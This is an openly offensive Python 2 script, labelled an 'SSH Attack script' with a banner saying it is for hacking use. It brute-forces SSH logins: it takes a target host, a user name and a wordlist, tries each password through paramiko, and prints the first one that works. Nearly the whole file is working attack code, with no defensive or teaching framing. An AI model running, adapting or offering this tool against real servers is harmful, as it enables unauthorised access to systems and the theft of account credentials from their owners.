import socket
import sys
import os
try :
	import paramiko
except :
	#! exit if lib, paramiko not found in python
	sys.lib(1);

print """

	SSH Attack script
	Written By : ybenel
	Email : ybenel@molero.xyz

	[WARNING] Only use it for hacking purpose

	MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
	MMMMMMMMMMNKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
	MMMMMMMMMNc.dWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
	MMMMMMMMWd. .kWMMMMMMMMMMMMMMMMMMMMMMW0KMMMMMMMMMM
	MMMMMMMMk:;. 'OMMMMMMMMMMMMMMMMMMMMMWx.,0MMMMMMMMM
	MMMMMMMK:ok.  ,0MMMMMMMMMMMMMMMMMMMWO. .cXMMMMMMMM
	MMMMMMNl:KO.   ;KWNXK00O0000KXNWMMWO' .c;dWMMMMMMM
	MMMMMMx,xNk.    .;'...    ....';:l:.  ,0l,0MMMMMMM
	MMMMMK;,l;. .,:cc:;.                  .dx,lWMMMMMM
	MMMMWo    ,dKWMMMMWXk:.      .cdkOOxo,. ...OMMMMMM
	MMMM0'   cXMMWKxood0WWk.   .lkONMMNOOXO,   lWMMMMM
	MMMWl   ;XMMNo.    .lXWd. .dWk;;dd;;kWM0'  '0MMMMM
	kxko.   lWMMO.      .kMO. .OMMK;  .kMMMNc   oWMMMM
	X0k:.   ;KMMXc      :XWo  .dW0c,lo;;xNMK,   'xkkk0
	kko'     :KMMNkl::lkNNd.   .dkdKWMNOkXO,    .lOKNW
	0Kk:.     .lOXWMMWN0d,       'lxO0Oko;.     .ckkOO
	kkkdodo;.    .,;;;'.  .:ooc.     .        ...ck0XN
	0XWMMMMWKxc'.          ;dxc.          .,cxKK0OkkOO
	MMMMMMMMMMMN0d:'.  .'        .l'  .;lxKWMMMMMMMMMN
	MMMMMMMMMMMMMMMN0xo0O:,;;;;;;xN0xOXWMMMMMMMMMMMMMM
	MMMMMMMMMMMMMMMMMMMMMMWWWWWMMMMMMMMMMMMMMMMMMMMMMM
	MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
	MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
	MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
	MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
	
	\n\n
	"""

def _brute_():
    global host,user,wordlist;
    host = raw_input("[*] Target Server : ");
    user = raw_input("[*] Target User : ");
    wordlist = raw_input("[*] Wordlist : ");

    ssh = paramiko.SSHClient();
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy());
    f = open(wordlist,'r');
    data = f.readlines();
    len_data = len(data);
    print "[!] wordlist contain [ %s ] words."%len_data
    print "[!] connected to target ssh [ %s ]."%host
    print "[!] starting attack on user [ %s ]."%user
    print "\n\n";
    for pas in data:
        pas = pas.replace("\n","");
        len_data -= 1;
        try:
            ssh.connect(host,port=22,username=user, password=pas);
            print "\n";
            print "------------------------------------------------------------------"
            print "[ %s ] [success] user : %s | password : %s ."%(len_data,user,pas);
            print "------------------------------------------------------------------"
            sys.exit(1);
        except paramiko.AuthenticationException:
            print "[ %s ] [error] password %s is not correct."%(len_data,pas);




try:
    _brute_();
except KeyboardInterrupt:
    print "\n\n\t[ok] operation cancelled successfully [ ctrl + c ] pressed.\n\n";
    sys.exit(1);
except socket.error:
    print "\n\t[fail] unable to establish connection on target ssh [ %s ]."%host;
    sys.exit(1);
except IOError:
    print "\n\t[fail] unable to open or read wordlist. please recheck it again.\n\n";
    sys.exit(1);
except:
    pass
